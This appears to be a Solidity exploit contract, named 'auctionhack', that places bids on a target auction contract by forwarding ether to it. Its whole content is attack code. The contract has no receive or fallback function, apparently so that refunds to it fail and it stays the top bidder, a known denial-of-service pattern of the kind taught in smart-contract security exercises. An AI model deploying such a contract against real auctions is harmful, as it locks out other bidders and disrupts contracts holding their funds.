// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface auction {
    function bid() external payable;
}

contract auctionhack {
    auction public auctioncontract;

    constructor(address _address) {
        auctioncontract = auction(_address);
    }

    function bid() public payable {
        auctioncontract.bid{value: msg.value}();
    }
}